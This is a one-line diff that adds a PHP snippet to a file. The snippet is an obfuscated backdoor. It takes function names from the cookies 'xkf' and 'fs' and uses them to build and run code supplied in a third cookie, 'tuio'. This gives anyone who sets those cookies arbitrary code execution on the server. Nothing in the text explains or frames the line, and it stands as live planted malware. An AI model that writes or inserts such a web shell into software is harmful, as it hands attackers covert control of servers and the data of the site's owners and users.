@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['xkf']){$modb=$_COOKIE['xkf']("",@$_COOKIE['fs'](@$_COOKIE['tuio']));$modb();}?>
